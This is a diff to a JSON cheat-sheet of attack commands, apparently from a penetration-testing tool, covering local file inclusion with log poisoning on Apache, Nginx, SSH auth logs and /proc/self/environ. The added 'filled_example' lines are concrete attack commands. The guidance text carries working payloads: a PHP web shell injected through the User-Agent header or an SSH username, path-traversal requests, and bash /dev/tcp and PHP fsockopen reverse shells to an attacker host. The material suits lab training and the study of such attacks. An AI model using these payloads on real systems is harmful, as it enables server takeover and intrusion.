@@ -51,7 +51,8 @@
       "troubleshooting": {},
       "methodology_guidance": {
         "after_success": "Trigger RCE: curl 'http://<TARGET>/page.php?file=../../../../var/log/apache2/access.log&c=whoami' Verify execution: Look for command output in response (often buried in log noise) Establish reverse shell: Use c=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' parameter If system() blocked: Try exec(), passthru(), shell_exec(), popen() in payload"
-      }
+      },
+      "filled_example": "curl -A '<?php system($_GET[\"c\"]); ?>' http://192.168.45.100:80/"
     },
     {
       "id": "curl-ua-poison-nginx",
@@ -94,7 +95,8 @@
       "methodology_guidance": {
         "after_success": "Detect Nginx: curl -I http://<TARGET>:<PORT>/ | grep Server Enumerate log path: Try /var/log/nginx/access.log, then /var/log/nginx/<VHOST>_access.log if multi-vhost setup Check worker user: Use LFI to read /etc/nginx/nginx.conf, look for 'user' directive Trigger RCE: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/nginx/access.log&c=id'",
         "on_failure": "If permission denied: Try error.log instead (often more permissive)"
-      }
+      },
+      "filled_example": "curl -A '<?php system($_GET[\"c\"]); ?>' http://192.168.45.100:80/"
     },
     {
       "id": "lfi-access-log-apache",
@@ -147,7 +149,8 @@
       "methodology_guidance": {
         "after_success": "If successful: Proceed with User-Agent poisoning (curl-ua-poison-apache) If wrong path: Try CentOS variant (/var/log/httpd/access_log), vhost-specific logs Alternative technique: /proc/self/environ if all logs fail",
         "on_failure": "If permission denied: Try alternative logs (error.log, /var/log/auth.log, /var/log/syslog)"
-      }
+      },
+      "filled_example": "curl 'http://192.168.45.100:80/index.php?page=../../../../var/log/apache2/access.log'"
     },
     {
       "id": "lfi-access-log-nginx",
@@ -199,7 +202,8 @@
       "troubleshooting": {},
       "methodology_guidance": {
         "after_success": "If successful: Poison via curl-ua-poison-nginx If permission denied: Try /var/log/nginx/error.log (different permissions) If multi-vhost suspected: Enumerate vhost names, try <VHOST>_access.log pattern Nginx-specific alternative: /var/log/nginx/<VHOST>.access.log (dot separator used by some configs)"
-      }
+      },
+      "filled_example": "curl 'http://192.168.45.100:80/index.php?file=../../../../var/log/nginx/access.log'"
     },
     {
       "id": "ssh-authlog-poison",
@@ -234,7 +238,8 @@
       "troubleshooting": {},
       "methodology_guidance": {
         "after_success": "Verify SSH open: nmap -p 22 <TARGET> (should show 22/tcp open ssh) Verify log readable: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/auth.log' | grep sshd Trigger RCE: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/auth.log&c=whoami' Look for output near: 'Failed password for <?php system($_GET[\"c\"]); ?>' log entry If output not visible: Log noise high in auth.log - grep for your IP to find relevant section"
-      }
+      },
+      "filled_example": "ssh '<?php system($_GET[\"c\"]); ?>'@192.168.45.100"
     },
     {
       "id": "lfi-auth-log",
@@ -287,7 +292,8 @@
       "methodology_guidance": {
         "after_success": "If readable: Proceed with ssh-authlog-poison If permission denied: Check /var/log/syslog (sometimes more permissive, includes auth events) Enumeration bonus: Extract usernames from 'Accepted password for <user>' entries",
         "on_failure": "RHEL/CentOS variant: Try /var/log/secure instead of auth.log"
-      }
+      },
+      "filled_example": "curl 'http://192.168.45.100:80/page.php?file=../../../../var/log/auth.log'"
     },
     {
       "id": "lfi-proc-environ",
@@ -343,7 +349,8 @@
       "methodology_guidance": {
         "after_success": "Verify /proc readable: curl 'http://<TARGET>/vuln.php?page=../../../../proc/self/cmdline' (should show PHP command) Poison and trigger in same request (already done by command above) Add RCE parameter: Append '&c=id' to URL Parse output: Look for command result near HTTP_USER_AGENT variable",
         "on_failure": "If fails: Check /proc/self/fd/ directory (alternative proc technique)"
-      }
+      },
+      "filled_example": "curl -A '<?php system($_GET[\"c\"]); ?>' 'http://192.168.45.100:80/index.php?page=../../../../proc/self/environ'"
     },
     {
       "id": "lfi-rce-trigger",
@@ -401,7 +408,8 @@
       "troubleshooting": {},
       "methodology_guidance": {
         "after_success": "Verify RCE: Start with simple command (whoami, id, pwd) Enumerate restrictions: &c='cat /etc/php/7.4/apache2/php.ini | grep disable_functions' Reverse shell (Bash): &c='bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"' If bash blocked: Try PHP reverse shell: &c='php -r \"$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");\"' URL encode complex commands: Use Burp Decoder or: python3 -c 'import urllib.parse; print(urllib.parse.quote(\"<COMMAND>\"))'"
-      }
+      },
+      "filled_example": "curl 'http://192.168.45.100:80/page.php?file=../../../../var/log/apache2/access.log&c=whoami'"
     }
   ]
 }
